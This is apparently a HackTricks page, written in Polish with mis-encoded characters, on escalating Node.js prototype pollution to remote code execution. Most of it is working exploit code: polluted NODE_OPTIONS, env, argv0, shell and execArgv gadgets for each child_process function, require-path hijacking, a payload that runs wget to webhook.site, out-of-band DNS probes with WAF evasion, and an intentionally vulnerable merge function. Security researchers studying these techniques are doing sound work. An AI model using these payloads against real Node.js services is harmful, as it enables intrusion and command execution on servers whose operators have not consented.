# Prototype Pollution do RCE

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>

## Podatny kod

Wyobra≈∫ sobie prawdziwy kod JS, kt√≥ry u≈ºywa poni≈ºszego kodu:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE poprzez zmienne ≈õrodowiskowe

**PP2RCE** oznacza **Prototype Pollution to RCE** (Remote Code Execution).

Zgodnie z tym [**opisem**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), kiedy **proces jest uruchamiany** za pomocƒÖ pewnej metody z **`child_process`** (takiej jak `fork` lub `spawn` lub innych), wywo≈Çywana jest metoda `normalizeSpawnArguments`, kt√≥ra wykorzystuje **gad≈ºet prototype pollution do tworzenia nowych zmiennych ≈õrodowiskowych**:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
Sprawd≈∫ ten kod, mo≈ºesz zobaczyƒá, ≈ºe jest mo≈ºliwe **zatrucie `envPairs`** poprzez **zanieczyszczenie** atrybutu `.env`.

### **Zatrucie `__proto__`**

{% hint style="warning" %}
Nale≈ºy zauwa≈ºyƒá, ≈ºe ze wzglƒôdu na to, jak dzia≈Ça funkcja **`normalizeSpawnArguments`** z biblioteki **`child_process`** w Node, gdy co≈õ jest wywo≈Çywane w celu **ustawienia nowej zmiennej ≈õrodowiskowej** dla procesu, wystarczy **zanieczy≈õciƒá cokolwiek**.\
Na przyk≈Çad, je≈õli wykonasz `__proto__.avar="valuevar"`, proces zostanie uruchomiony z zmiennƒÖ o nazwie `avar` i warto≈õciƒÖ `valuevar`.

Jednak aby **zmienna ≈õrodowiskowa by≈Ça pierwsza**, musisz **zanieczy≈õciƒá atrybut `.env`** i (tylko w niekt√≥rych metodach) ta zmienna bƒôdzie **pierwsza** (co umo≈ºliwia atak).

Dlatego **`NODE_OPTIONS`** nie znajduje siƒô wewnƒÖtrz `.env` w poni≈ºszym ataku.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### Zatrucie `constructor.prototype`

{% code-tabs %}
{% code-tabs-item title="exploit.js" %}
```javascript
function exploit() {
  const payload = {
    constructor: {
      prototype: {
        exec: require('child_process').execSync('cat /etc/passwd')
      }
    }
  };

  Object.assign({}, payload);
}

exploit();
```
{% endcode-tabs-item %}
{% endcode-tabs %}

W powy≈ºszym przyk≈Çadzie przedstawiono technikƒô zatrucia `constructor.prototype` w celu wykonania zdalnego kodu (RCE). W linii 5 tworzony jest obiekt `payload`, kt√≥ry zawiera zatrute `constructor.prototype`. W tym przypadku, zatrucie polega na przypisaniu funkcji `exec` do `constructor.prototype`. Funkcja `exec` jest u≈ºywana do wykonania polecenia systemowego `cat /etc/passwd`. Nastƒôpnie, w linii 9, wywo≈Çywana jest funkcja `Object.assign({}, payload)`, kt√≥ra powoduje wykonanie zatrutego kodu.

Aby wykorzystaƒá tƒô technikƒô, nale≈ºy uruchomiƒá powy≈ºszy kod na podatnym serwerze Node.js. Po wykonaniu kodu, zostanie wy≈õwietlona zawarto≈õƒá pliku `/etc/passwd`.
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE poprzez zmienne ≈õrodowiskowe + wiersz polece≈Ñ

Podobny ≈Çadunek do poprzedniego, ale z pewnymi zmianami, zosta≈Ç zaproponowany w [**tym artykule**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** G≈Ç√≥wne r√≥≈ºnice to:

* Zamiast przechowywaƒá ≈Çadunek nodejs w pliku `/proc/self/environ`, przechowuje go w **argv0** w **`/proc/self/cmdline`**.
* Nastƒôpnie, zamiast wymagaƒá pliku `/proc/self/environ` za pomocƒÖ **`NODE_OPTIONS`**, wymaga **`/proc/self/cmdline`**.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Interakcja z DNS

Za pomocƒÖ poni≈ºszych payload√≥w mo≈ºliwe jest wykorzystanie zmiennej ≈õrodowiskowej NODE\_OPTIONS, o kt√≥rej wcze≈õniej rozmawiali≈õmy, w celu wykrycia, czy dzia≈Ça poprzez interakcjƒô z DNS:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
Lub, aby uniknƒÖƒá WAF-√≥w pytajƒÖcych o domenƒô:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE vuln child\_process functions

W tej sekcji przeanalizujemy **ka≈ºdƒÖ funkcjƒô z `child_process`** w celu wykonania kodu i sprawdzimy, czy mo≈ºemy u≈ºyƒá jakiejkolwiek techniki, aby zmusiƒá tƒô funkcjƒô do wykonania kodu:

<details>

<summary>Eksploatacja funkcji <code>exec</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Wykorzystanie <code>execFile</code></strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
Aby **`execFile`** dzia≈Ça≈Ço, **MUSI wykonywaƒá node** dla NODE\_OPTIONS, aby dzia≈Ça≈Çy.\
Je≈õli **nie** wykonuje **node**, musisz znale≈∫ƒá, jak mo≈ºesz **zmieniƒá wykonanie** tego, co jest wykonywane **za pomocƒÖ zmiennych ≈õrodowiskowych** i je ustawiƒá.

**Inne** techniki **dzia≈ÇajƒÖ** bez tego wymagania, poniewa≈º jest **mo≈ºliwo≈õƒá modyfikacji** **tego, co jest wykonywane** za pomocƒÖ zanieczyszczenia prototypu. (W tym przypadku, nawet je≈õli mo≈ºesz zanieczy≈õciƒá `.shell`, nie zanieczyszczasz tego, co jest wykonywane).

</details>

<details>

<summary>Eksploatacja <code>fork</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>eksploatacja spawn</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> eksploatacja</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong>Eksploatacja <code>execSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>exploitacja spawnSync</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Wymuszanie Spawn

W poprzednich przyk≈Çadach zobaczy≈Çe≈õ, jak wywo≈Çaƒá funkcjƒô gadgeta, kt√≥ra **wywo≈Çuje `spawn`**, musi byƒá **obecna** (wszystkie metody **`child_process`** u≈ºywane do wykonania czego≈õ jƒÖ wywo≈ÇujƒÖ). W poprzednim przyk≈Çadzie by≈Ça **czƒô≈õciƒÖ kodu**, ale co je≈õli kod jej **nie wywo≈Çuje**.

### Kontrolowanie ≈õcie≈ºki pliku require

W tym [**innym wpisie**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) u≈ºytkownik mo≈ºe kontrolowaƒá ≈õcie≈ºkƒô pliku, w kt√≥rym zostanie wykonane **`require`**. W takim scenariuszu atakujƒÖcy musi po prostu **znale≈∫ƒá plik `.js` w systemie**, kt√≥ry **wywo≈Ça metodƒô spawn po zaimportowaniu**.\
Przyk≈Çady powszechnych plik√≥w wywo≈ÇujƒÖcych funkcjƒô spawn po zaimportowaniu to:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Znajd≈∫ **wiƒôcej plik√≥w poni≈ºej**

NastƒôpujƒÖcy prosty skrypt bƒôdzie wyszukiwa≈Ç **wywo≈Ça≈Ñ** z **child\_process** **bez ≈ºadnego wype≈Çnienia** (aby uniknƒÖƒá pokazywania wywo≈Ça≈Ñ wewnƒÖtrz funkcji):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>InteresujƒÖce pliki znalezione przez poprzedni skrypt</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Ustawianie ≈õcie≈ºki pliku wymaganego za pomocƒÖ zanieczyszczenia prototypu

{% hint style="warning" %}
**Poprzednia technika wymaga**, aby **u≈ºytkownik kontrolowa≈Ç ≈õcie≈ºkƒô pliku**, kt√≥ry zostanie **wymagany**. Ale to nie zawsze jest prawdƒÖ.
{% endhint %}

Jednak je≈õli kod ma wykonaƒá wymaganie po zanieczyszczeniu prototypu, nawet je≈õli **nie kontrolujesz ≈õcie≈ºki**, kt√≥ra zostanie wymagana, **mo≈ºesz wymusiƒá inne zanieczyszczenie prototypu**. Dlatego nawet je≈õli linia kodu wyglƒÖda tak: `require("./a_file.js")` lub `require("bytes")`, **wymaga pakietu, kt√≥ry zanieczyszczy≈Çe≈õ**.

Dlatego je≈õli wymaganie zostanie wykonane po zanieczyszczeniu prototypu i nie ma funkcji spawn, to jest to atak:

* Znajd≈∫ **plik `.js` w systemie**, kt√≥ry po **wymaganiu** **wykona co≈õ za pomocƒÖ `child_process`**
* Je≈õli mo≈ºesz przes≈Çaƒá pliki na platformƒô, kt√≥rƒÖ atakujesz, mo≈ºesz przes≈Çaƒá taki plik
* Zanieczyszczaj ≈õcie≈ºki, aby **wymusiƒá za≈Çadowanie pliku `.js`**, kt√≥ry wykona co≈õ z child\_process
* **Zanieczyszczaj environ/cmdline**, aby wykonaƒá dowolny kod, gdy wywo≈Çywana jest funkcja wykonujƒÖca child\_process (patrz poczƒÖtkowe techniki)

#### Wymaganie absolutne

Je≈õli wykonane wymaganie jest **bezwzglƒôdne** (`require("bytes")`) i **pakiet nie zawiera g≈Ç√≥wnego** w pliku `package.json`, mo≈ºesz **zanieczy≈õciƒá atrybut `main`** i spowodowaƒá, ≈ºe **wymaganie wykona inny plik**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="z≈Ço≈õliwy.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### Wzglƒôdne require - 1

Je≈õli zamiast ≈õcie≈ºki bezwzglƒôdnej zostanie za≈Çadowana ≈õcie≈ºka wzglƒôdna, mo≈ºna zmusiƒá node do za≈Çadowania innej ≈õcie≈ºki:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="z≈Ço≈õliwy.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Wzglƒôdne require - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="z≈Ço≈õliwy.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Wzglƒôdne require - 3

Podobnie jak poprzednie, to zosta≈Ço znalezione w [**tym opracowaniu**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs).
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## Gad≈ºety VM

W artykule [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) wskazano r√≥wnie≈º, ≈ºe kontrola **`contextExtensions`** z niekt√≥rych metod biblioteki **`vm`** mo≈ºe byƒá u≈ºywana jako gad≈ºet.\
Jednak, podobnie jak poprzednie metody **`child_process`**, zosta≈Ç **naprawiony** w najnowszych wersjach.

## Poprawki i nieoczekiwane zabezpieczenia

Nale≈ºy zauwa≈ºyƒá, ≈ºe zanieczyszczenie prototypu dzia≈Ça, je≈õli **atrybut** obiektu, do kt√≥rego siƒô odwo≈Çujemy, jest **niezdefiniowany**. Je≈õli w **kodzie** ten **atrybut** jest **ustawiony** na **warto≈õƒá**, nie bƒôdzie mo≈ºna go nadpisaƒá.

Od czerwca 2022 roku w [**tym commicie**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) zmienna `options` zamiast `{}` jest **`kEmptyObject`**. To **zapobiega zanieczyszczeniu prototypu** wp≈ÇywajƒÖcemu na **atrybuty** **`options`** w celu uzyskania RCE.\
Przynajmniej od wersji v18.4.0 ta ochrona zosta≈Ça **wdro≈ºona**, dlatego **exploity** `spawn` i `spawnSync` dotyczƒÖce tych metod **ju≈º nie dzia≈ÇajƒÖ** (je≈õli nie u≈ºywa siƒô opcji!).

W [**tym commicie**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) **zanieczyszczenie prototypu** **`contextExtensions`** z biblioteki vm zosta≈Ço **r√≥wnie≈º naprawione** przez ustawienie opcji na **`kEmptyObject`** zamiast **`{}`.**

### **Inne gad≈ºety**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

## Odwo≈Çania

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

